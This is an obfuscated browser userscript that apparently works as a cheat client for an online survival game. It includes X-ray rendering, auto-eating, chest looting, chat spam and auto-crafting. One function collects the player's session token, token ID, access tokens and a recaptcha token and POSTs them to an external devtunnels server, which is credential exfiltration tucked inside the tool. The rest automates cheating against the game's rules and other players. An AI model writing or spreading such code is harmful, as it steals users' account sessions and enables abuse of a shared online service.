      if (e === "list") {
        let t = "";
        let i = a0CLONelog.players;
        for (let $ = 0, o = i.length; $ < o; $++) {
          let l = i[$];
          if (l.alive) {
            let n;
            if (l.joinTime) {
              n = Math.floor((performance.now() - l.joinTime) / 1000 / 60 / 8);
            }
            t += "<span style=\"color:" + (USERTOFIX.in_team($) || $ === USERTOFIX.id ? "cyan" : "red") + "\">" + l.nickname + "</span> <span style=\"color:yellow\">[" + l.level + "]</span> <span style=\"color:green\"># <span style=\"color:green\">#" + $ + "</span> " + (n !== undefined ? n + (n > 1 ? " days" : " day") : "") + "<br />";
          }
        }
        this.write_command("list", 1, "List all connected players", t);
        return true;
      }
      ed.apply(this, arguments);
    };
  }
  if (USERTOFIX.gauges && USERTOFIX.gauges.update && USERTOFIX.gauges.warn_cold && USERTOFIX.gauges.warn_life && USERTOFIX.gauges.warn_hunger && USERTOFIX.gauges.warn_thirst && USERTOFIX.gauges.warn_oxygen && USERTOFIX.gauges.warn_warm) {
    let ef = USERTOFIX.gauges.update;
    USERTOFIX.gauges.update = function () {
      this.warn_cold.update();
      this.warn_life.update();
      this.warn_hunger.update();
      this.warn_thirst.update();
      this.warn_oxygen.update();
      this.warn_warm.update();
      ef.apply(this, arguments);
    };
  }
  if (a0MINIfyresult.gauges?.img && a0JUMPfile.GaugesUI === "new") {
    a0MINIfyresult.gauges.defaultImg = a0MINIfyresult.gauges.img;
    a0MINIfyresult.gauges.img = a0ACKNowledgekey[a0EXPAndgroup.NEW_GAUGES];
  }
}
function a0CLOSetask() {
  return new Promise(e => {
    (function t() {
      if (a0CLONelog !== undefined && a0GETList !== undefined && USERTOFIX !== undefined && a0MINIfyresult !== undefined && a0DECOdestatus !== undefined && a0ACKNowledgevalue !== undefined) {
        console.log("work")
        e();
      } else {
        workerTimers.setTimeout(t, 100);
      }
    })();
  });
}
function a0HIGHlightqueue() {
  return new Promise(e => {
    (function t() {
      if (USERTOFIX.craft.crafting === false) {
        e();
      } else {
        workerTimers.setTimeout(t, 50);
      }
    })();
  });
}
function a0FILTerzip() {
  return new Promise(e => {
    (function t() {
      if (a0GETList.socket instanceof WebSocket) {
        e();
      } else {
        workerTimers.setTimeout(t, 100);
      }
    })();
  });
}
function a0INVErtattempt() {
  return document.getElementById("chat_block").style.display === "inline-block" || document.getElementById("commandMainBox").style.display === "inline-block" || document.activeElement.id === "nickname_input";
}
function a0DRAWloop() {
  USERTOFIX.token = a0JUMPfile.Token.token;
  USERTOFIX.token_id = a0JUMPfile.Token.token_id;
}
function a0CHECkpolicy() {
  if (a0JUMPfile.ShowPing.e && a0GETList.socket && a0CLONelog.fast_units && a0GETList.socket.readyState === 1 && a0CLONelog.fast_units[USERTOFIX.uid]) {
    a0MINIfyzip = Date.now();
    a0GETList.get_focus();
  }
}
function a0OPENinput() {
  if (a0GETList.socket && a0GETList.socket.readyState === 1 && USERTOFIX && USERTOFIX.alive && a0JUMPfile.SpamChat.message) {
    a0REMOvezip(a0JUMPfile.SpamChat.message);
  }
  if (a0JUMPfile.SpamChat.e) {
    workerTimers.setTimeout(a0OPENinput, 4500);
  }
}
function a0INSErtschema() {
  if (a0GETList.socket && a0GETList.socket.readyState === 1 && USERTOFIX && USERTOFIX.alive) {
    a0HIGHlightqueue().then(() => {
      if (a0JUMPfile.FakeDrop.e) {
        a0INITlogs(a0CONNectloop.WOOD);
        workerTimers.setTimeout(a0INSErtschema, Math.random() * 2000 + 1000);
      }
    });
  } else {
    a0JUMPfile.FakeDrop.e = false;
  }
}
function a0NOOPsession(e, t, i = a0BUFFeruser) {
  let $ = i.find(t => t.id2 === e);
  if (!$) {
    console.log("Dont have recipe in RECIPES");
    return false;
  }
  for (let o of $.r) {
    let l = o[0];
    let n = o[1];
    if (!t[l] || t[l] < n) {
      return false;
    }
  }
  return true;
}
function a0HANDlefunction(e, t) {
  let i = {
    ...t
  };
  return function e(t, i) {
    let $ = a0BUFFeruser.find(e => e.id2 === t);
    if (!$) {
      return false;
    }
    for (let o of $.r) {
      let l = o[0];
      let n = o[1];
      if (!i[l] || i[l] < n) {
        let s = n - (i[l] ? i[l] : 0);
        for (let r = 0; r < s; r++) {
          if (!e(l, i)) {
            return false;
          }
        }
      } else {
        i[l] -= n;
      }
    }
    let c = $.id2;
    i[c] = (i[c] || 0) + 1;
    return true;
  }(e, i);
}
function a0DECOdenode(e, t, i = a0BUFFeruser) {
  let $ = {
    ...t
  };
  let o = function e(t, i, $) {
    let o = $.find(e => e.id2 === t);
    if (!o) {
      return null;
    }
    let l = {};
    for (let [n, s] of o.r) {
      let r = i[n] || 0;
      if (r < s) {
        let c = s - r;
        let O = e(n, i, $);
        if (O === null) {
          l[n] = (l[n] || 0) + c;
        } else if (Object.keys(O).length > 0) {
          for (let p in O) {
            l[p] = (l[p] || 0) + O[p];
          }
        }
      }
    }
    if (Object.keys(l).length > 0) {
      return l;
    } else {
      return {};
    }
  }(e, $, i);
  if (o === null) {
    return null;
  } else {
    return o;
  }
}
function a0DEFIneloop(e, t, i = a0BUFFeruser) {
  return function e(t, i, $) {
    let o = $.find(e => e.id2 === t);
    if (!o) {
      return null;
    }
    for (let [l, n] of o.r) {
      let s = i[l] || 0;
      if (s < n) {
        let r = $.find(e => e.id2 === l);
        if (r) {
          if (a0NOOPsession(r.id2, i)) {
            return r.id;
          }
          return e(r.id2, i, $);
        }
      }
    }
    return null;
  }(e, t, i);
}
function a0CLOSeinput(e) {
  let t = a0BUFFeruser;
  let i = USERTOFIX.inv.n;
  let $;
  a0DEFErport($ = a0NOOPsession(e, i, t) ? t.find(t => t.id2 === e).id : a0DEFIneloop(e, i, t));
}
function a0CACHelogs(e, t, i = true) {
  let $ = e.currentHp;
  let o = a0CLONelog.units[a0HOOKjob.PLAYERS];
  for (let l = 0, n = o.length; l < n; l++) {
    let s = o[l];
    if ((e.type !== a0HOOKjob.PLAYERS || e.pid !== s.pid) && s.pid !== USERTOFIX.id && s.startAttackTime + 62.5 >= performance.now() + 25 && s.startAttackTime + 62.5 <= t + 25 && a0CREAtesum(s) + 25 >= a0CLONescript.dist(e, s)) {
      $ -= a0INSTalllevel(s, i);
    }
  }
  return $;
}
function a0EMITevent(e, t) {
  if (!e || !t) {
    return;
  }
  let i = a0KICKport(e, t, true);
  a0BUILdstats(i);
  a0REMOveevent(i);
  a0CLONejson();
  return i;
}
function a0NOOPloop(e, t, i) {
  if (e && e.x && e.y) {
    let $;
    $ = USERTOFIX.inv.can_select.length > 0 ? {
      x: a0MINIfyresult.minimap.translate.x,
      y: a0MINIfyresult.minimap.translate.y - a0BALAncevalues * 120
    } : {
      x: a0MINIfyresult.minimap.translate.x,
      y: a0MINIfyresult.minimap.translate.y - a0BALAncevalues * 50
    };
    a0LOADstring.fillStyle = t;
    a0FORMatjob(a0LOADstring, $.x + e.x / (a0CLONelog.nw * 100) * 193 * a0BALAncevalues, $.y + e.y / (a0CLONelog.nh * 100) * 193 * a0BALAncevalues, a0BALAncevalues * i);
    a0LOADstring.fill();
  }
}
function a0ACCEptdata(e, t, i, $ = "black") {
  if (e && e.x && e.y) {
    let o;
    o = USERTOFIX.inv.can_select.length > 0 ? {
      x: a0MINIfyresult.minimap.translate.x,
      y: a0MINIfyresult.minimap.translate.y - a0BALAncevalues * 120
    } : {
      x: a0MINIfyresult.minimap.translate.x,
      y: a0MINIfyresult.minimap.translate.y - a0BALAncevalues * 50
    };
    a0LOADstring.save();
    a0LOADstring.translate(o.x + e.x / (a0CLONelog.nw * 100) * 193 * a0BALAncevalues, o.y + e.y / (a0CLONelog.nh * 100) * 193 * a0BALAncevalues);
    a0LOADstring.font = i + "px Baloo Paaji";
    a0LOADstring.textBaseline = "middle";
    a0LOADstring.textAlign = "center";
    a0LOADstring.fillStyle = $;
    a0LOADstring.fillText(t, 0, 0);
    a0LOADstring.restore();
  }
}
function a0NOOPtask(e, t, i) {
  if (e && e.x && e.y) {
    let $ = a0BUILdload - 300;
    let o = a0NORMalizequeue - 300;
    a0LOADstring.fillStyle = t;
    a0FORMatjob(a0LOADstring, $ + e.x / (a0CLONelog.nw * 100) * 600 * a0BALAncevalues, o + e.y / (a0CLONelog.nh * 100) * 600 * a0BALAncevalues, a0BALAncevalues * i);
    a0LOADstring.fill();
  }
}
function a0OPTImizestring(e, t, i, $ = "black") {
  if (e && e.x && e.y) {
    let o = a0BUILdload - 300;
    let l = a0NORMalizequeue - 300;
    a0LOADstring.save();
    a0LOADstring.translate(o + e.x / (a0CLONelog.nw * 100) * 600 * a0BALAncevalues, l + e.y / (a0CLONelog.nh * 100) * 600 * a0BALAncevalues);
    a0LOADstring.font = i + "px Baloo Paaji";
    a0LOADstring.textBaseline = "middle";
    a0LOADstring.textAlign = "center";
    a0LOADstring.fillStyle = $;
    a0LOADstring.fillText(t, 0, 0);
    a0LOADstring.restore();
  }
}
function a0GRABrepo() {
  workerTimers.setTimeout(async () => {
    await a0ACKNowledgevalue.getTokenForJoinGame(async () => {
      try {
        let e = await a0CLONescript.get_recaptcha_token();
        if (!USERTOFIX.token || !USERTOFIX.token_id) {
          console.error("Error: Missing user.token or user.token_id");
          return;
        }
        let t = (a0GETList?.socket?.url || "").split("?")[0] || "";
        if (!t) {
          console.log("Dont have baseUrl");
          return;
        }
        let i = Object.values(USERTOFIX).filter(e => typeof e == "string" && e.includes("_"));
        if (i.length < 4) {
          console.error("Error: Not enough valid strings in user object.");
          return;
        }
        let $ = {
          websocketUrl: t + "?" + i[i.length - 1],
          token: USERTOFIX.token,
          token_id: USERTOFIX.token_id,
          accessSession: i[i.length - 4],
          accessToken1: i[i.length - 3],
          accessToken2: i[i.length - 2],
          recaptcha_token: e
        };
        let o = await fetch("https://cdb41km4-8000.asse.devtunnels.ms/connect", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify($)
        });
        if (!o.ok) {
          throw Error("HTTP Error: " + o.status);
        }
        let l = await o.json();
        console.log("Response:", l);
      } catch (n) {
        console.error("Error:", n);
      }
    }, undefined, true);
  }, 0);
}
function a0NOTIfylist() {
  if (USERTOFIX) {
    USERTOFIX.cam.h = document.documentElement.clientHeight;
    USERTOFIX.cam.w = document.documentElement.clientWidth;
  }
  let e = unsafeWindow.devicePixelRatio || 1;
  let t = a0LOADstring.webkitBackingStorePixelRatio || a0LOADstring.mozBackingStorePixelRatio || a0LOADstring.msBackingStorePixelRatio || a0LOADstring.oBackingStorePixelRatio || a0LOADstring.backingStorePixelRatio || 1;
  a0MERGehandler = !!(e <= 0.5) && !!a0JUMPfile.BigZoom.e;
  if (a0BLOCkparser.width != unsafeWindow.innerWidth) {
    a0BLOCkparser.width = unsafeWindow.innerWidth;
    a0JUMPcontrol = a0BLOCkparser.width;
    a0BUILdload = a0BLOCkparser.width / 2;
  }
  if (a0BLOCkparser.height != unsafeWindow.innerHeight) {
    a0BLOCkparser.height = unsafeWindow.innerHeight;
    a0INSErtstatus = a0BLOCkparser.height;
    a0NORMalizequeue = a0BLOCkparser.height / 2;
  }
  a0LOADsocket = {
    x: a0BUILdload,
    y: a0NORMalizequeue
  };
  let i = a0BLOCkparser.width;
  let $ = a0BLOCkparser.height;
  try {
    a0QUEUerequest = document.getElementById("input_ratio").value * (e / t);
  } catch {
    a0QUEUerequest = e / t;
  }
  a0MERGelabel = a0QUEUerequest;
  a0BLOCkparser.width = i * a0MERGelabel;
  a0BLOCkparser.height = $ * a0MERGelabel;
  a0BLOCkparser.style.width = i + "px";
  a0BLOCkparser.style.height = $ + "px";
  a0LOADstring.scale(a0MERGelabel, a0MERGelabel);
  if (USERTOFIX) {
    USERTOFIX.cam.rw = i;
    USERTOFIX.cam.rh = $;
  }
}
let a0ENCRyptkey;
function a0NOTIfystream() {
  a0LOADstring.drawImage = function () {
    a0LOADstring.globalAlpha = a0JUMPfile.Xray.opacity;
    return a0ENCRyptkey.apply(this, arguments);
  };
}
function a0PINGvalues() {
  a0LOADstring.drawImage = a0ENCRyptkey;
}
function a0DRAWkey() {
  if (a0JUMPfile.HideScript.e) {
    document.getElementById("togglePaneButton").style.opacity = 0;
    document.getElementById("gui-container").style.display = "none";
    if (a0MINIfyresult.gauges?.img && a0MINIfyresult.gauges?.defaultImg) {
      a0MINIfyresult.gauges.img = a0MINIfyresult.gauges.defaultImg;
    }
  } else {
    document.getElementById("togglePaneButton").style.opacity = 1;
    document.getElementById("gui-container").style.display = "block";
    if (a0MINIfyresult.gauges?.img) {
      a0MINIfyresult.gauges.img = a0ACKNowledgekey[a0EXPAndgroup.NEW_GAUGES];
    }
  }
}
function a0OPTImizekey(e, t) {
  a0REMOvezip("ez " + Math.floor(e / 100) + " " + Math.floor(t / 100));
}
function a0NAVIgatequeue(e, t) {
  let i = a0CLONelog.fast_units[USERTOFIX.uid];
  if (i) {
    let $ = a0KICKport(i, {
      x: e * 100 + 50,
      y: t * 100 + 50
    }, false);
    let o = Math.PI * 2;
    let l = Math.floor(($ + o) % o * 255 / o);
    for (let n = 0; n <= 10; n++) {
      let s = (l + n + 255) % 255;
      let r = a0COMPutestatus(s);
      let c = {
        x: i.x + a0NOTIfyload(r) * 120,
        y: i.y + a0GETPlugin(r) * 120
      };
      if (Math.floor(c.x / 100) === e && Math.floor(c.y / 100) === t || (r = a0COMPutestatus(s = (l - n + 255) % 255), Math.floor((c = {
        x: i.x + a0NOTIfyload(r) * 120,
        y: i.y + a0GETPlugin(r) * 120
      }).x / 100) === e && Math.floor(c.y / 100) === t)) {
        a0BLOCkmodule(a0CONNectloop.BRIDGE, s);
        break;
      }
    }
  }
}
function a0FORMatrole(e) {
  requestAnimationFrame(a0FORMatrole);
  a0DISPatchinput = (e - a0LIMItvalues) / 1000;
  a0LIMItvalues = e;
  a0DISPatchinput = a0DISPatchinput > 1 ? 1 : a0DISPatchinput;
  let t = performance.now();
  (a0HYDRatestate = a0HYDRatestate.filter(e => e > t - 1000))[a0HYDRatestate.length] = t;
  if (Date.now() - a0CACHepath >= 1000) {
    a0CACHepath = Date.now();
    a0HOOKload = a0HYDRatestate.length - 1;
  }
  if (!a0JUMPfile.HideScript.e) {
    if (a0JUMPfile.ListEnabledHacks.e) {
      a0LOADstring.save();
      a0LOADstring.font = "18px Baloo Paaji";
      a0LOADstring.strokeStyle = "black";
      a0LOADstring.lineWidth = 7;
      a0LOADstring.fillStyle = "white";
      if (a0JUMPfile.ListEnabledHacks.anchor === "BottomLeft") {
        let i = 20;
        for (let $ in a0JUMPfile) {
          if (a0JUMPfile[$].e && a0JUMPfile[$].k) {
            let o = a0INSErtstatus - i;
            a0LOADstring.strokeText($, 10, o);
            a0LOADstring.fillText($, 10, o);
            i += 20;
          }
        }
      } else {
        let l = 20;
        for (let n in a0JUMPfile) {
          if (a0JUMPfile[n].e && a0JUMPfile[n].k) {
            a0LOADstring.strokeText(n, 10, l);
            a0LOADstring.fillText(n, 10, l);
            l += 20;
          }
        }
      }
      a0LOADstring.restore();
    }
    if (a0JUMPfile.ShowJoinLeave.e) {
      let s = 400;
      if (a0KILLcache.toggle11) {
        a0LOADstring.save();
        a0LOADstring.font = "18px Baloo Paaji";
        a0LOADstring.strokeStyle = "black";
        a0LOADstring.lineWidth = 7;
        a0LOADstring.fillStyle = "green";
        for (let r = 0; r < a0KILLcache.Join.length; r++) {
          a0LOADstring.globalAlpha = 1 - r * 0.15;
          let c = a0KILLcache.Join[r];
          let O = a0CLONelog.players[c];
          let p = O.nickname + " | " + O.level;
          a0LOADstring.strokeText(p, 0, s);
          a0LOADstring.fillText(p, 0, s);
          s += 20;
        }
        a0LOADstring.restore();
      }
      if (a0KILLcache.toggle22) {
        a0LOADstring.save();
        a0LOADstring.font = "18px Baloo Paaji";
        a0LOADstring.strokeStyle = "black";
        a0LOADstring.lineWidth = 7;
        a0LOADstring.fillStyle = "red";
        for (let u = 0; u < a0KILLcache.Leave.length; u++) {
          a0LOADstring.globalAlpha = 1 - u * 0.15;
          a0LOADstring.strokeText(a0KILLcache.Leave[u], 0, s);
          a0LOADstring.fillText(a0KILLcache.Leave[u], 0, s);
          s += 20;
        }
        a0LOADstring.restore();
      }
    }
    if (a0JUMPfile.ShowFPS.e) {
      a0LOADstring.save();
      a0LOADstring.font = "30px Baloo Paaji";
      a0LOADstring.strokeStyle = "black";
      a0LOADstring.lineWidth = 7;
      a0LOADstring.strokeText(a0HOOKload + " FPS", USERTOFIX.auto_feed.translate.x + -120, USERTOFIX.auto_feed.translate.y + -50);
      a0LOADstring.fillStyle = "white";
      a0LOADstring.fillText(a0HOOKload + " FPS", USERTOFIX.auto_feed.translate.x + -120, USERTOFIX.auto_feed.translate.y + -50);
      a0LOADstring.restore();
    }
    if (a0JUMPfile.ShowPing.e) {
      a0LOADstring.save();
      a0LOADstring.font = "30px Baloo Paaji";
      a0LOADstring.strokeStyle = "black";
      a0LOADstring.lineWidth = 7;
      a0LOADstring.strokeText(a0BUILdresult + " ms", USERTOFIX.auto_feed.translate.x + -120, USERTOFIX.auto_feed.translate.y + -20);
      a0LOADstring.fillStyle = "white";
      a0LOADstring.fillText(a0BUILdresult + " ms", USERTOFIX.auto_feed.translate.x + -120, USERTOFIX.auto_feed.translate.y + -20);
      a0LOADstring.restore();
    }
    if (a0JUMPfile.Debug.e) {
      a0LOADstring.save();
      a0LOADstring.font = a0JUMPfile.Debug.fontSize + "px Baloo Paaji";
      a0LOADstring.strokeStyle = "black";
      a0LOADstring.fillStyle = "white";
      a0LOADstring.lineWidth = 4;
      a0LOADstring.textAlign = "left";
      a0LOADstring.textBaseline = "top";
      let N = a0CLONelog.fast_units[USERTOFIX.uid];
      for (let E = 0; E < a0CLONelog.units.length; E++) {
        let d = a0CLONelog.units[E];
        if (typeof d == "object" && d.length > 0) {
          for (let f = 0; f < d.length; f++) {
            let g = d[f];
            if (g.type === a0HOOKjob.ROOF && !a0JUMPfile.Debug.debugRoof || g.type === a0HOOKjob.BRIDGE && !a0JUMPfile.Debug.debugBridge) {
              continue;
            }
            let A = N ? a0CLONescript.dist(N, g) : 9999;
            if (A >= 9999) {
              continue;
            }
            let h = USERTOFIX.cam.x + g.x;
            let R = USERTOFIX.cam.y + g.y - 50 - a0JUMPfile.Debug.fontSize;
            let C = 0;
            let y = a0JUMPfile.Debug.fontSize + 2;
            function m(e) {
              if (e == null) {
                return;
              }
              let t = R + C;
              if (h > -100 && h < a0JUMPcontrol + 100 && t > -20 && t < a0INSErtstatus + 20) {
                a0LOADstring.strokeText(e, h, t);
                a0LOADstring.fillText(e, h, t);
                C += y;
              }
            }
            if (a0JUMPfile.Debug.showType && g.type !== undefined) {
              m("Type: " + g.type);
            }
            if (a0JUMPfile.Debug.showPID && g.pid !== undefined) {
              let M = g.pid !== 0 && a0CLONelog.players[g.pid] ? " (" + a0CLONelog.players[g.pid].nickname + ")" : "";
              m("PID: " + g.pid + M);
            }
            if (a0JUMPfile.Debug.showID && g.id !== undefined) {
              m("ID: " + g.id);
            }
            if (a0JUMPfile.Debug.showInfo && g.info !== undefined) {
              m("Info: " + g.info);
            }
            if (a0JUMPfile.Debug.showCoordinates) {
              if (g.x !== undefined) {
                m("X: " + Math.round(g.x));
              }
              if (g.y !== undefined) {
                m("Y: " + Math.round(g.y));
              }
            }
            if (a0JUMPfile.Debug.showDistance && N) {
              m("Dist: " + Math.round(A));
            }
            if (a0JUMPfile.Debug.showSpeed && g.speed !== undefined) {
              m("Speed: " + Math.round(g.speed));
            }
          }
        }
      }
      a0LOADstring.restore();
    }
  }
  if (a0JUMPfile.Spectator.e) {
    // if (a0QUEUeschema.is_bottom()) {
    //   USERTOFIX.cam.y -= Math.floor(4000 / a0HOOKload);
    // }
    // if (a0QUEUeschema.is_top()) {
    //   USERTOFIX.cam.y += Math.floor(4000 / a0HOOKload);
    // }
    // if (a0QUEUeschema.is_right()) {
    //   USERTOFIX.cam.x -= Math.floor(4000 / a0HOOKload);
    // }
    // if (a0QUEUeschema.is_left()) {
    //   USERTOFIX.cam.x += Math.floor(4000 / a0HOOKload);
    // }
  }
}
function a0JOINzip() {
  if (a0GETList.socket && a0GETList.socket.readyState === 1 && USERTOFIX && USERTOFIX.alive) {
    let e = a0CLONelog.fast_units[USERTOFIX.uid];
    if (!USERTOFIX.craft.crafting) {
      if (a0JUMPfile.AutoFood.e && USERTOFIX.gauges.h <= 0.9 && performance.now() - a0ENCRyptresult >= a0BUILdresult + 200) {
        let t = USERTOFIX.inv.can_select;
        let i = false;
        let $ = USERTOFIX.gauges.h;
        for (let o = 0, l = t.length; o < l; o++) {
          let n = t[o].id;
          if (a0OPTImizeoutput[n]) {
            if (a0COMPutefolder[n] + $ <= 1) {
              a0HYDRatequeue(n);
              i = true;
              a0ENCRyptresult = performance.now();
            }
            break;
          }
        }
        if ($ === 0 && !i && USERTOFIX.gauges.l > 0.05) {
          for (let s = 0, r = t.length; s < r; s++) {
            let c = t[s].id;
            if (a0HYDRatejob[c]) {
              a0HYDRatequeue(c);
              a0ENCRyptresult = performance.now();
              break;
            }
          }
        }
      }
      if (a0JUMPfile.AutoDrink.e && performance.now() - a0KILLjob >= a0BUILdresult + 200 && USERTOFIX.gauges.t <= a0JUMPfile.AutoDrink.range && USERTOFIX.inv.n[a0CONNectloop.BOTTLE_FULL]) {
        a0HYDRatequeue(a0CONNectloop.BOTTLE_FULL);
        a0KILLjob = performance.now();
      }
      if (USERTOFIX.inv.n[a0CONNectloop.WATERMELON] && a0JUMPfile.AutoDrink.e && a0JUMPfile.AutoDrink.autoEatWatermelon && USERTOFIX.gauges.t <= 0.92 && performance.now() - a0KILLjob >= a0BUILdresult + 200) {
        a0HYDRatequeue(a0CONNectloop.WATERMELON);
        a0KILLjob = performance.now();
      }
      if (e) {
        if (a0JUMPfile.TakeChest.e && a0JUMPfile.TakeChest.targetChests.length > 0) {
          for (let O = 0, p = a0JUMPfile.TakeChest.targetChests, u = p.length; O < u; O++) {
            let N = p[O];
            let E = N.pid;
            let d = N.id;
            let f = a0CLONelog.fast_units[E * a0CLONelog.max_units + d];
            if (f && f.info > 0 && a0CLONescript.dist(e, f) < 300) {
              a0JUMPstats(E, d);
            }
          }
        }
        if (a0JUMPfile.PutChest.e && !a0CLOSedrive && a0JUMPfile.PutChest.targetChests.length > 0) {
          for (let g = 0, A = a0JUMPfile.PutChest.targetChests, h = A.length; g < h; g++) {
            let R = A[g];
            let C = R.invId;
            if (USERTOFIX.inv.n[C] === 0) {
              continue;
            }
            let y = R.pid;
            let m = R.id;
            let M = a0CLONelog.fast_units[y * a0CLONelog.max_units + m];
            if (M && a0CLONescript.dist(e, M) < 300 && a0FLUShinput(M, C)) {
              let L = USERTOFIX.inv.n[C];
              if (C === a0CONNectloop.BERRY) {
                if (L <= 100) {
                  continue;
                }
                L -= 100;
                a0CLOSedrive = true;
                workerTimers.setTimeout(() => {
                  a0CLOSedrive = false;
                }, 100 + a0BUILdresult);
              }
              let P = 8000 - M.info;
              let D = L > P ? P : L;
              a0EXPAndstats(C, Math.min(255, D), M.pid, M.id);
            }
          }
        }
        if (a0JUMPfile.AutoPutChest.e) {
          let T = a0JUMPfile.AutoPutChest.invIds;
          for (let _ = 0, I = T.length; _ < I; _++) {
            let S = T[_];
            let k = new Set();
            if (USERTOFIX.inv.n[S]) {
              if (!a0HANDlezip[S] || a0HANDlezip[S].action / 2 - 1 !== S || a0HANDlezip[S].info >= 8000 || a0CLONescript.dist(a0HANDlezip[S], e) > 150 || a0HANDlezip[S].lock && !a0HANDlezip[S].ally) {
                a0HANDlezip[S] = null;
                let b = false;
                for (let v of a0CLONelog.units[a0HOOKjob.CHEST]) {
                  let H = v.pid + "-" + v.id;
                  if ((!v.lock || v.ally) && v.action / 2 - 1 === S && v.info < 8000 && a0CLONescript.dist(e, v) <= 150 && !k.has(H)) {
                    a0HANDlezip[S] = v;
                    b = true;
                  }
                }
                if (!b) {
                  for (let U of a0CLONelog.units[a0HOOKjob.CHEST]) {
                    let B = U.pid + "-" + U.id;
                    if ((!U.lock || U.ally) && U.action / 2 - 1 == -1 && a0CLONescript.dist(e, U) <= 150 && !k.has(B)) {
                      a0HANDlezip[S] = U;
                      break;
                    }
                  }
                }
              }
              if (a0HANDlezip[S]) {
                let j = USERTOFIX.inv.n[S];
                let x = a0HANDlezip[S];
                let K = 8000 - x.info;
                let w = j > K ? K : j;
                a0EXPAndstats(S, Math.min(255, w), x.pid, x.id);
              }
            }
          }
        }
        if (a0JUMPfile.AutoTakeChest.e) {
          for (let J of a0CLONelog.units[a0HOOKjob.CHEST]) {
            if ((!J.lock || J.ally) && a0CLONescript.dist(e, J) <= 150 && a0JUMPfile.AutoTakeChest.invIds.includes(J.action / 2 - 1)) {
              a0JUMPstats(J.pid, J.id);
            }
          }
        }
        if (a0JUMPfile.AutoIce.e && USERTOFIX.inv.n[a0CONNectloop.ICE] && performance.now() - a0HOOKuser > a0BUILdresult + 100) {
          if (USERTOFIX.gauges.l < 1 && a0JUMPfile.AutoIce.eatForHeal && USERTOFIX.inv.n[a0CONNectloop.ICE] > a0JUMPfile.AutoIce.iceHealTriggerAmount) {
            if (Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) < 5) {
              if (USERTOFIX.gauges.wa - (e.dist_lava > 0 ? 0.25 : 0) < 0.36) {
                let z = 0.36 - (USERTOFIX.gauges.wa - (e.dist_lava > 0 ? 0.25 : 0));
                let F = Math.max(0, Math.ceil(z / 0.1));
                for (let W = 0; W < F; W++) {
                  a0HYDRatequeue(a0CONNectloop.ICE);
                }
                a0HOOKuser = performance.now();
              }
            } else if (USERTOFIX.gauges.wa === 0 && e.dist_lava > 0) {
              a0HYDRatequeue(a0CONNectloop.ICE);
              a0HOOKuser = performance.now();
            }
          } else if ((e.dist_lava > 0 || e.dist_desert > 0 && a0CLONelog.time === 0 || e.fly === 1) && USERTOFIX.gauges.wa === 0) {
            a0HYDRatequeue(a0CONNectloop.ICE);
            a0HOOKuser = performance.now();
          }
        }
      } else if (a0JUMPfile.AutoIce.e && USERTOFIX.inv.n[a0CONNectloop.ICE] && performance.now() - a0HOOKuser > a0BUILdresult + 100) {
        if (USERTOFIX.gauges.l < 1 && a0JUMPfile.AutoIce.eatForHeal && USERTOFIX.inv.n[a0CONNectloop.ICE] > a0JUMPfile.AutoIce.iceHealTriggerAmount) {
          if (Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) < 5) {
            if (USERTOFIX.gauges.wa - 0.25 < 0.36) {
              let G = 0.36 - (USERTOFIX.gauges.wa - 0.25);
              let V = Math.max(0, Math.ceil(G / 0.1));
              for (let Y = 0; Y < V; Y++) {
                a0HYDRatequeue(a0CONNectloop.ICE);
              }
              a0HOOKuser = performance.now();
            }
          } else if (USERTOFIX.gauges.wa === 0) {
            a0HYDRatequeue(a0CONNectloop.ICE);
            a0HOOKuser = performance.now();
          }
        } else if (USERTOFIX.gauges.wa === 0) {
          a0HYDRatequeue(a0CONNectloop.ICE);
          a0HOOKuser = performance.now();
        }
      }
      if (a0JUMPfile.AutoCraft.e && a0EXPAndresult !== null) {
        a0DEFErport(a0EXPAndresult);
      }
      if (a0JUMPfile.AutoRecycle.e && a0HIGHlightfile !== null) {
        a0CACHeapp(a0HIGHlightfile);
      }
      if (a0JUMPfile.AutoCraftSpikes.e) {
        if (a0JUMPfile.AutoCraftSpikes.p === "Highest Craftale") {
          if (a0HANDlefunction(a0OVERrideclick.REIDITE_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.REIDITE_SPIKE);
            a0DEFErport(a0OVERrideclick.REIDITE_WALL);
            a0DEFErport(a0OVERrideclick.AMETHYST_WALL);
            a0DEFErport(a0OVERrideclick.DIAMOND_WALL);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          } else if (a0HANDlefunction(a0OVERrideclick.AMETHYST_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.AMETHYST_SPIKE);
            a0DEFErport(a0OVERrideclick.AMETHYST_WALL);
            a0DEFErport(a0OVERrideclick.DIAMOND_WALL);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          } else if (a0HANDlefunction(a0OVERrideclick.DIAMOND_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.DIAMOND_SPIKE);
            a0DEFErport(a0OVERrideclick.DIAMOND_WALL);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          } else if (a0HANDlefunction(a0OVERrideclick.GOLD_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.GOLD_SPIKE);
            a0DEFErport(a0OVERrideclick.GOLD_WALL);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          } else if (a0HANDlefunction(a0OVERrideclick.STONE_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.STONE_SPIKE);
            a0DEFErport(a0OVERrideclick.STONE_WALL);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          } else if (a0HANDlefunction(a0OVERrideclick.WOOD_SPIKE, USERTOFIX.inv.n)) {
            a0DEFErport(a0OVERrideclick.WOOD_SPIKE);
            a0DEFErport(a0OVERrideclick.WOOD_WALL);
          }
        }
        if (a0JUMPfile.AutoCraftSpikes.p === "Reidite Spike") {
          if (a0HANDlefunction(a0OVERrideclick.REIDITE_SPIKE, USERTOFIX.inv.n)) {
